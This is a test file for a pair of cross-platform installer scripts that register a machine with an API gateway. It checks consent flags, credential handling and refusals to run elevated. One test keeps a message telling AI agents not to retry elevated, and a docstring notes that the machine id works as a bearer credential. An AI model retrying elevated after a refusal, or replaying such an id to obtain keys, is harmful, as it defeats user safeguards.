            fake_api + "/junk",
            "-AllowNonDefaultEndpoint",
            "-YesRegister",
        ],
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 9, out
    assert installed_paths(profile) == []


@pytest.mark.parametrize("path", [INSTALL_SH, INSTALL_PS1])
def test_both_headers_document_exit_9(path):
    text = path.read_text(encoding="utf-8")
    assert "#   9  " in text, f"{path.name} uses exit 9 but its EXIT CODES table omits it"


# ==========================================================================
# 4. the server's own explanation has to survive to the screen
# ==========================================================================
@needs_powershell
def test_ps_shows_the_body_of_a_non_2xx_reply(tmp_path, fake_api):
    """Windows PowerShell 5.1 reads the error stream to EOF before throwing.

    Invoke-Yb5Request's catch then called GetResponseStream() + ReadToEnd(),
    which returned zero bytes from an already-exhausted stream, and the inner
    `catch { '' }` made that indistinguishable from "no body". Result: every
    non-2xx reply lost the server's message on Windows while curl showed it on
    Unix. The body is on $_.ErrorDetails.Message, which was never read.
    """
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(
        profile,
        [
            "-Api",
            fake_api + "/busy",
            "-AllowNonDefaultEndpoint",
            "-YesRegister",
            "-NoLiveTest",
        ],
    )
    out = proc.stdout + proc.stderr
    assert "the pool is full, sorry" in out, out
    # The `type` field travels the same path and is what names the refusal.
    assert "pool_full" in out


@needs_sh
def test_sh_shows_the_body_of_a_non_2xx_reply(tmp_path, sh_shim, fake_api):
    """The POSIX half of the same property, so the two cannot drift."""
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        [
            "--api",
            fake_api + "/busy",
            "--allow-nondefault-endpoint",
            "--yes-register",
            "--no-bin-link",
        ],
        sh_shim,
    )
    out = proc.stdout + proc.stderr
    assert "the pool is full, sorry" in out
    assert "pool_full" in out


# ==========================================================================
# 5. the endpoint travels with the key it belongs to
# ==========================================================================
@needs_sh
def test_sh_rerun_keeps_the_stored_endpoint(tmp_path, sh_shim, fake_api):
    """The key was read back from disk while the endpoint was re-derived.

    So `sh install.sh` on a machine installed against a local gateway rewrote
    base_url and ANTHROPIC_BASE_URL to https://yangble5.com while keeping a key
    that host never issued -- a config that authenticates nowhere, produced by
    the command the installer itself calls idempotent.
    """
    home = tmp_path / "home"
    home.mkdir()
    local = fake_api + "/ok"
    first = sh_run(
        home,
        ["--api", local, "--allow-nondefault-endpoint", "--yes-register", "--no-bin-link"],
        sh_shim,
    )
    assert first.returncode == 0, first.stdout + first.stderr

    second = sh_run(home, ["--no-bin-link"], sh_shim)
    out = second.stdout + second.stderr
    assert second.returncode == 0, out
    creds = (home / ".yangble5" / "credentials").read_bytes()
    assert f"YANGBLE5_API={local}\n".encode() in creds, "the stored endpoint was replaced"
    assert b"https://yangble5.com" not in creds


@needs_sh
def test_sh_refuses_a_conflicting_explicit_endpoint(tmp_path, sh_shim, fake_api):
    home = tmp_path / "home"
    home.mkdir()
    local = fake_api + "/ok"
    sh_run(
        home,
        ["--api", local, "--allow-nondefault-endpoint", "--yes-register", "--no-bin-link"],
        sh_shim,
    )
    proc = sh_run(home, ["--api", "https://yangble5.com", "--no-bin-link"], sh_shim)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 1, out
    assert "--force-register" in out
    creds = (home / ".yangble5" / "credentials").read_bytes()
    assert f"YANGBLE5_API={local}\n".encode() in creds


@needs_powershell
def test_ps_rerun_keeps_the_stored_endpoint(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    local = fake_api + "/ok"
    first = ps_run(
        profile,
        ["-Api", local, "-AllowNonDefaultEndpoint", "-YesRegister", "-NoLiveTest"],
    )
    assert first.returncode == 0, first.stdout + first.stderr
    second = ps_run(profile, ["-NoLiveTest"])
    assert second.returncode == 0, second.stdout + second.stderr
    creds = (profile / ".yangble5" / "credentials").read_bytes()
    assert f"YANGBLE5_API={local}\n".encode() in creds
    assert b"https://yangble5.com" not in creds


# ==========================================================================
# 6. --reinstall must not become a second machine
# ==========================================================================
@needs_sh
def test_sh_reinstall_preserves_the_machine_salt(tmp_path, sh_shim, fake_api):
    """`rm -rf ~/.yangble5` deleted the salt the fingerprint is built from.

    With a new salt the gateway finds no binding, so it mints a genuinely
    SECOND key with a second daily allowance and burns one of the network's
    registrations for the day -- while both scripts told the reader that only
    --force-register could produce a new key.
    """
    home = tmp_path / "home"
    home.mkdir()
    args = [
        "--api",
        fake_api + "/ok",
        "--allow-nondefault-endpoint",
        "--yes-register",
        "--no-bin-link",
    ]
    assert sh_run(home, args, sh_shim).returncode == 0
    salt_file = home / ".yangble5" / "machine-id"
    before = salt_file.read_bytes()

    proc = sh_run(home, [*args, "--reinstall"], sh_shim)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert salt_file.read_bytes() == before, (
        "--reinstall changed this machine's identity"
    )


@needs_powershell
def test_ps_reinstall_preserves_the_machine_salt(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    args = [
        "-Api",
        fake_api + "/ok",
        "-AllowNonDefaultEndpoint",
        "-YesRegister",
        "-NoLiveTest",
    ]
    assert ps_run(profile, args).returncode == 0
    salt_file = profile / ".yangble5" / "machine-id"
    before = salt_file.read_bytes()
    proc = ps_run(profile, [*args, "-Reinstall"])
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert salt_file.read_bytes() == before


@needs_sh
def test_sh_reports_a_reissue_as_a_reissue(tmp_path, sh_shim, fake_api):
    """A 200 with "reused": true is not a registration.

    Neither installer read `reused` or `warning`, so the same key coming back
    with a fresh secret was announced as "registered", and --force-register
    looked like it had created a new account with a new allowance.
    """
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        [
            "--api",
            fake_api + "/reused",
            "--allow-nondefault-endpoint",
            "--yes-register",
            "--no-bin-link",
        ],
        sh_shim,
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "re-issued" in out
    assert "same key_id" in out
    assert "already had a key" in out, "the server's own warning was dropped"


@needs_powershell
def test_ps_reports_a_reissue_as_a_reissue(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(
        profile,
        [
            "-Api",
            fake_api + "/reused",
            "-AllowNonDefaultEndpoint",
            "-YesRegister",
            "-NoLiveTest",
        ],
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "re-issued" in out
    assert "already had a key" in out


# ==========================================================================
# 7. --show-key does what --help says it does
# ==========================================================================
@needs_sh
def test_sh_show_key_works_on_a_rerun(tmp_path, sh_shim, fake_api):
    """print_key_once returned early unless MODE was "registered".

    A re-run sets MODE=reused, so --show-key printed nothing at all -- and
    because the early return sat above both branches, the "your key was NOT
    printed, read it here" block was silent too.
    """
    home = tmp_path / "home"
    home.mkdir()
    args = [
        "--api",
        fake_api + "/ok",
        "--allow-nondefault-endpoint",
        "--yes-register",
        "--no-bin-link",
    ]
    assert sh_run(home, args, sh_shim).returncode == 0
    proc = sh_run(home, ["--no-bin-link", "--show-key"], sh_shim)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert GOOD_KEY in out, "--show-key printed nothing on a re-used key"


@needs_powershell
def test_ps_show_key_works_on_a_rerun(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    args = [
        "-Api",
        fake_api + "/ok",
        "-AllowNonDefaultEndpoint",
        "-YesRegister",
        "-NoLiveTest",
    ]
    assert ps_run(profile, args).returncode == 0
    proc = ps_run(profile, ["-NoLiveTest", "-ShowKey"])
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert GOOD_KEY in out


# ==========================================================================
# 8. flags that take a value must not die on `shift`
# ==========================================================================
@needs_sh
@pytest.mark.parametrize("flag", ["--api", "--model", "--email", "--invite"])
def test_sh_value_flag_without_a_value_reports_usage(tmp_path, sh_shim, flag):
    """`shift` is a POSIX SPECIAL built-in.

    `shift 2` with one argument left does not merely fail: in dash it
    TERMINATES the shell with status 2 -- the code this script's own header
    reserves for "refused: running as root". --email and --invite omitted the
    guard that --api and --model had.
    """
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(home, [flag], sh_shim)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 1, f"{flag} exited {proc.returncode}: {out}"
    assert "needs" in out
    assert "shift" not in out


# ==========================================================================
# 9. the Git Bash refusal has to hand back a command
# ==========================================================================
@needs_sh
def test_sh_mingw_refusal_gives_a_runnable_command(tmp_path, tmp_path_factory):
    """uname -s under Git Bash returns MINGW64_NT-..., which used to fall into
    the catch-all and print a prose sentence naming install.ps1 -- from inside
    a shell that cannot execute a .ps1 file. Every other refusal in the script
    ends in something you can paste."""
    shim = tmp_path_factory.mktemp("mingw")
    fake = shim / "uname"
    fake.write_text(
        "#!/bin/sh\n"
        'case "${1:-}" in\n'
        "  -s) echo MINGW64_NT-10.0-26100 ;;\n"
        "  -m) echo x86_64 ;;\n"
        "  -n) echo testhost ;;\n"
        "  *)  echo MINGW64_NT-10.0-26100 ;;\n"
        "esac\n",
        newline="\n",
    )
    fake.chmod(fake.stat().st_mode | stat.S_IEXEC)
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(home, ["--dry-run"], str(shim))
    out = proc.stdout + proc.stderr
    assert proc.returncode == 4, out
    # It must recognise WHICH Windows shell this is, not just fall into the
    # generic "unsupported platform" arm -- that arm cannot know that WSL is
    # the alternative, or that this shell can invoke powershell.exe directly.
    assert "Git Bash" in out, "the MINGW case is gone; this fell through to the catch-all"
    assert "wsl" in out
    assert "powershell.exe" in out
    assert "install.ps1" in out
    # And it must fire before the banner promised anything.
    assert "Installs to" not in out


# ==========================================================================
# 10. the script must not publish a claim about a live deployment's mode
# ==========================================================================
def test_install_sh_does_not_assert_yangble5_com_has_no_registration():
    """install.sh's own header tells an AI agent to read this file to the human
    and the landing page tells users to `less install.sh`, so its comments are
    user-facing documentation. Asserting "and the current state of
    yangble5.com" inside a file SERVED BY yangble5.com encodes a setting that
    an operator can change, and it steered readers into the BYOK interview
    instead of the registration one."""
    text = INSTALL_SH.read_text(encoding="utf-8")
    assert "current state of yangble5.com" not in text
    for line in text.splitlines():
        stripped = line.strip()
        if not stripped.startswith("#"):
            continue
        low = stripped.lower()
        if "yangble5.com" in low and "does not" in low and "regist" in low:
            pytest.fail(f"a comment claims yangble5.com offers no registration: {stripped}")


# ==========================================================================
# 11. the Windows uninstaller removes everything the installer created
# ==========================================================================
def test_embedded_ps_uninstaller_removes_the_path_entry():
    """-AddToPath writes a per-user PATH entry, a registry change and the one
    thing install.ps1 creates outside .yangble5. The uninstaller it embeds used
    to say outright that it would not remove it, while the header promised an
    uninstaller that "removes everything it created"."""
    text = INSTALL_PS1.read_text(encoding="utf-8")
    assert "it will not remove the per-user PATH entry" not in text
    start = text.index("function Write-Uninstaller")
    end = text.index("# DELIBERATELY NO yangble5-uninstall.cmd", start)
    embedded = text[start:end]
    assert "SetEnvironmentVariable('Path'" in embedded, (
        "the embedded uninstaller never writes the per-user PATH back"
    )
    assert "removed PATH entry" in embedded


# ==========================================================================
# 12. the two implementations expose the same consent surface
# ==========================================================================
def test_both_installers_expose_the_same_consent_flags():
    """A gate that exists on one platform and not the other is not a gate."""
    sh_text = INSTALL_SH.read_text(encoding="utf-8")
    ps_text = INSTALL_PS1.read_text(encoding="utf-8")
    assert "--yes-register" in sh_text
    assert "--allow-nondefault-endpoint" in sh_text
    assert "$YesRegister" in ps_text
    assert "$AllowNonDefaultEndpoint" in ps_text
    # Both must reserve 9 for an abort and keep 6 for the BYOK-empty install.
    assert "EX_UPSTREAM=9" in sh_text
    assert "$EX_UPSTREAM = 9" in ps_text


# ── the machine id is a bearer credential, so it must not reach a transcript ──

def test_neither_installer_prints_the_full_machine_id():
    """The machine id must be truncated wherever it is shown.

    This is not a privacy nicety. `POST /auth/register` accepts a bare
    machine_id with no other authentication and returns the account's
    plaintext api_key -- verified against the live gateway on 2026-07-22: a
    second call carrying only the same machine_id came back `reused: true`
    with a working key. The full value is therefore a bearer credential.

    Both installers already refuse to print the api_key by default, and
    install.sh says why in its own header: "stdout here is an AI agent's
    transcript as often as it is a human's scrollback. A secret printed there
    has been disclosed to whatever that transcript is later sent to." The
    machine id had been exempt from that reasoning while being equivalent to
    the secret it protects.
    """
    problems = []

    for path, pattern in (
        (INSTALL_SH, '"machine id ${FINGERPRINT}"'),
        (INSTALL_PS1, '"machine id $fingerprint"'),
    ):
        src = path.read_text(encoding="utf-8")
        if pattern in src:
            problems.append(f"{path.name}: prints the whole machine id: {pattern}")

    # The truncation itself, so removing the guard without removing the print
    # cannot pass either.
    sh = INSTALL_SH.read_text(encoding="utf-8")
    ps1 = INSTALL_PS1.read_text(encoding="utf-8")
    if "cut -c1-12" not in sh:
        problems.append("install.sh: no 12-character truncation of the machine id")
    if "Substring(0, 12)" not in ps1:
        problems.append("install.ps1: no 12-character truncation of the machine id")

    assert problems == [], "\n".join(problems)


def test_neither_installer_derives_a_register_field_from_the_machine_id():
    """Truncating the PRINTED machine id is pointless while half of it is sent.

    Both installers used to attach
        "label": "installer-<first 32 characters of the fingerprint>"
    to the registration body -- added in the same edit that cut the printed
    value down to 12 characters, and for the opposite effect. Where it ended up:

      * gateway/app.py hands payload.label to storage.issue_key, which writes it
        into users.label. Nothing in this project ever selects that column
        again, so it bought exactly nothing;
      * the machine id is peppered by storage.hash_machine_id() before it is
        stored, whose own docstring gives the reason -- "a raw fingerprint table
        would let anyone holding a stolen copy test candidate fingerprints".
        Half the raw value, in the clear, in the neighbouring table, handed part
        of that back to every backup;
      * the consent screen enumerates what leaves the machine and never
        mentioned a label, so the list a human says yes to was incomplete.

    Source-level rather than on-the-wire so it holds on every platform,
    including the ones where neither interpreter is available. The two
    behavioural tests below check the actual request.
    """
    sh = INSTALL_SH.read_text(encoding="utf-8")
    ps1 = INSTALL_PS1.read_text(encoding="utf-8")

    problems = []
    if "cut -c1-32" in sh:
        problems.append(
            "install.sh: still takes a 32-character slice of the fingerprint "
            "(cut -c1-32) -- the printed value is truncated to 12"
        )
    if '"label":"installer-' in sh:
        problems.append("install.sh: still sends a fingerprint-derived label")
    if "Substring(0, 32)" in ps1:
        problems.append(
            "install.ps1: still takes a 32-character slice of the fingerprint "
            "(Substring(0, 32)) -- the printed value is truncated to 12"
        )
    if "'installer-' +" in ps1:
        problems.append("install.ps1: still sends a fingerprint-derived label")

    assert problems == [], "\n".join(problems)


@needs_sh
def test_sh_register_body_carries_the_machine_id_and_nothing_else(
    tmp_path, sh_shim, fake_api
):
    """What actually goes on the wire, which is the only place this is visible.

    Guards the same defect as the source-level test above, from the other end:
    the body must contain the fingerprint once, as `machine_id`, and no second
    field may carry any part of it.
    """
    home = tmp_path / "home"
    home.mkdir()
    clear_register_bodies()
    proc = sh_run(
        home,
        [
            "--api",
            fake_api + "/ok",
            "--allow-nondefault-endpoint",
            "--yes-register",
            "--no-bin-link",
        ],
        sh_shim,
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    _assert_register_body_is_machine_id_only(register_bodies())


@needs_powershell
def test_ps_register_body_carries_the_machine_id_and_nothing_else(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    clear_register_bodies()
    proc = ps_run(
        profile,
        [
            "-Api",
            fake_api + "/ok",
            "-AllowNonDefaultEndpoint",
            "-YesRegister",
            "-NoLiveTest",
        ],
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    _assert_register_body_is_machine_id_only(register_bodies())


def _assert_register_body_is_machine_id_only(bodies: list[str]) -> None:
    assert len(bodies) == 1, f"expected exactly one registration call, got {bodies!r}"
    raw = bodies[0]
    parsed = json.loads(raw)

    assert set(parsed) == {"machine_id"}, (
        "the registration body carries fields the consent screen does not "
        f"declare: {sorted(set(parsed) - {'machine_id'})!r} in {raw!r}"
    )

    fingerprint = parsed["machine_id"]
    assert re.fullmatch(r"[0-9a-f]{64}", fingerprint), (
        f"machine_id is not a 64-character lowercase sha256 digest: {fingerprint!r}"
    )

    # The generalised form: no future field may smuggle the digest back in under
    # another name, whether whole or sliced.
    assert raw.count(fingerprint[:32]) == 1, (
        "the first 32 characters of the machine id appear more than once in the "
        "registration body, so something other than machine_id is carrying part "
        f"of the fingerprint: {raw!r}"
    )


# ── a valid key into an empty pool is not a successful install ───────────────

_DRY_POOL_ARGS_SH = ["--allow-nondefault-endpoint", "--yes-register", "--no-bin-link",
                     "--no-live-test"]
_DRY_POOL_ARGS_PS = ["-AllowNonDefaultEndpoint", "-YesRegister", "-NoLiveTest"]


@needs_sh
def test_sh_relays_usable_now_false(tmp_path, sh_shim, fake_api):
    """The endpoint says the key it just issued cannot be served. Say so.

    gateway/app.py::_issuance_status attaches usable_now, not_usable_reason and
    not_usable_detail to every issuance, and its docstring gives the reason: the
    pool can be spent, the operator reserve can be engaged, or the upstream can
    be refusing, and "in every one of those cases the key is perfectly valid and
    every request it makes is refused. An installer that stores such a key and
    reports success is lying to its user on this gateway's behalf."

    Both installers dropped all three fields. `--no-live-test` is passed here on
    purpose: it is the configuration in which nothing else in the run can
    discover the problem, so the whole install ended on "the key is accepted".
    """
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(home, ["--api", fake_api + "/dry", *_DRY_POOL_ARGS_SH], sh_shim)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "cannot be served right now" in out, (
        "install.sh stored a key the endpoint had already said was unusable and "
        "reported nothing"
    )
    assert "pool is spent for today" in out, "the endpoint's own explanation was dropped"


@needs_powershell
def test_ps_relays_usable_now_false(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(profile, ["-Api", fake_api + "/dry", *_DRY_POOL_ARGS_PS])
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "cannot be served right now" in out, (
        "install.ps1 stored a key the endpoint had already said was unusable and "
        "reported nothing"
    )
    assert "pool is spent for today" in out, "the endpoint's own explanation was dropped"


@needs_sh
def test_sh_stays_quiet_when_the_pool_is_fine(tmp_path, sh_shim, fake_api):
    """The /ok fixture sends no usable_now at all, and neither did older gateways.

    A missing field must not be read as "unusable", or every install against an
    older or third-party endpoint gains a permanent false alarm.
    """
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(home, ["--api", fake_api + "/ok", *_DRY_POOL_ARGS_SH], sh_shim)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "cannot be served right now" not in out, out


@needs_powershell
def test_ps_stays_quiet_when_the_pool_is_fine(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(profile, ["-Api", fake_api + "/ok", *_DRY_POOL_ARGS_PS])
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "cannot be served right now" not in out, out


# ── the live probe must show the same thing on both platforms ────────────────

@needs_sh
def test_sh_prints_the_model_reply_from_the_live_probe(tmp_path, sh_shim, fake_api):
    """The completion probe exists to prove the stack answers, so show what it said."""
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        [
            "--api",
            fake_api + "/ok",
            "--allow-nondefault-endpoint",
            "--yes-register",
            "--no-bin-link",
        ],
        sh_shim,
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "POST /v1/messages -> 200" in out, out
    assert "pong" in out, "install.sh stopped printing the model's own reply"


@needs_powershell
def test_ps_prints_the_model_reply_from_the_live_probe(tmp_path, fake_api):
    """install.ps1 printed the status line and swallowed the reply.

    install.sh pulls the completion out with `json_string text`, which matches
    "text":"..." anywhere in the body. Get-JsonField walks only the top level
    and one step into "error", while the Anthropic shape puts the reply at
    content[0].text -- so on Windows the one end-to-end proof this verification
    step exists to produce was never shown, and a 200 carrying an empty
    completion was indistinguishable from a working one.

    Runs the live probe deliberately: -NoLiveTest would skip the call under
    test. The completion goes to the loopback fixture, which answers "pong".
    """
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(
        profile,
        ["-Api", fake_api + "/ok", "-AllowNonDefaultEndpoint", "-YesRegister"],
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "POST /v1/messages -> 200" in out, out
    assert "pong" in out, (
        "install.ps1 reported the completion succeeded without showing what came "
        "back; install.sh prints it, so the two disagree about what a user is told"
    )


# ── the elevation guard itself ──────────────────────────────────────────────
#
# These are the tests that DO run on an elevated machine, and they are the
# reason the skips above are honest rather than a way of turning a red matrix
# cell green. On GitHub's windows-latest runner -- which executes as an
# Administrator -- this is what the Windows jobs actually verify.

@pytest.mark.skipif(SH is None or not SH_ELEVATED, reason="shell does not report uid 0")
def test_sh_refuses_to_run_as_root(tmp_path):
    """install.sh must refuse, name the reason, and write nothing."""
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(home, ["--dry-run"], expect_refusal=True)
    out = proc.stdout + proc.stderr

    assert proc.returncode == EX_REFUSED_ELEVATED, out
    assert "REFUSING TO RUN AS ROOT" in out
    # Refusing is only half the promise; the run must also leave nothing behind.
    assert_the_run_wrote_nothing(home, "install.sh")


@pytest.mark.skipif(
    POWERSHELL is None or not PS_ELEVATED, reason="session is not Administrator"
)
def test_ps_refuses_to_run_elevated(tmp_path):
    """install.ps1 must refuse, name the reason, and write nothing.

    The message is also checked for the sentence aimed at an AI agent, because
    an agent that retries elevated after being refused turns a guard into an
    inconvenience. That sentence is the only thing standing between "refused"
    and "refused, then run again with more privileges".
    """
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(profile, ["-DryRun"], expect_refusal=True)
    out = proc.stdout + proc.stderr

    assert proc.returncode == EX_REFUSED_ELEVATED, out
    assert "REFUSING TO RUN ELEVATED" in out
    assert "do not retry this elevated" in out, (
        "the refusal no longer tells an AI agent not to escalate; without that "
        "line the guard reads as an obstacle to work around"
    )
    assert_the_run_wrote_nothing(profile, "install.ps1")


# ── the "wrote nothing" assertion, tested directly ─────────────────────────
#
# The two tests that use it are skipped unless the session is elevated, so on a
# developer's machine they never run and the helper is never exercised. That is
# precisely how the assertion it replaces reached CI broken: green everywhere it
# was written, red on all five windows-latest cells, over a directory the
# installer never touched. These run everywhere and need no privileges.


def test_wrote_nothing_accepts_a_genuinely_empty_home(tmp_path):
    assert_the_run_wrote_nothing(tmp_path / "absent", "probe")   # never created at all
    home = tmp_path / "home"
    home.mkdir()
    assert_the_run_wrote_nothing(home, "probe")


def test_wrote_nothing_accepts_the_directory_powershell_creates_by_itself(tmp_path):
    """The exact CI failure. Measured: a .ps1 whose whole body is `exit 0`,
    launched with USERPROFILE redirected, leaves this behind before the script
    under test runs a single statement."""
    home = tmp_path / "home"
    cache = home / "AppData" / "Local" / "Microsoft" / "Windows" / "PowerShell"
    cache.mkdir(parents=True)
    (cache / "cache.bin").write_bytes(b"x")
    assert_the_run_wrote_nothing(home, "install.ps1")


def test_wrote_nothing_rejects_the_install_directory(tmp_path):
    home = tmp_path / "home"
    (home / ".yangble5").mkdir(parents=True)
    with pytest.raises(AssertionError, match=r"refused to run and then created"):
        assert_the_run_wrote_nothing(home, "install.ps1")


def test_wrote_nothing_rejects_anything_not_on_the_allow_list(tmp_path):
    """An installer that starts writing somewhere new must still fail, by name."""
    home = tmp_path / "home"
    home.mkdir()
    (home / ".config").mkdir()
    with pytest.raises(AssertionError, match=r"left \['\.config'\]"):
        assert_the_run_wrote_nothing(home, "install.sh")


def test_wrote_nothing_rejects_output_hidden_inside_the_allow_listed_directory(tmp_path):
    """The check that keeps the allow-list from becoming a hiding place.

    `AppData` is where a Windows program would most plausibly put its state, so
    allow-listing the name without looking inside it would create exactly the
    blind spot an installer could write into undetected.
    """
    home = tmp_path / "home"
    (home / "AppData" / "Roaming").mkdir(parents=True)
    (home / "AppData" / "Roaming" / "yangble5-credentials").write_text("secret", encoding="utf-8")
    with pytest.raises(AssertionError, match=r"allow-listed because the host shell creates it"):
        assert_the_run_wrote_nothing(home, "install.ps1")
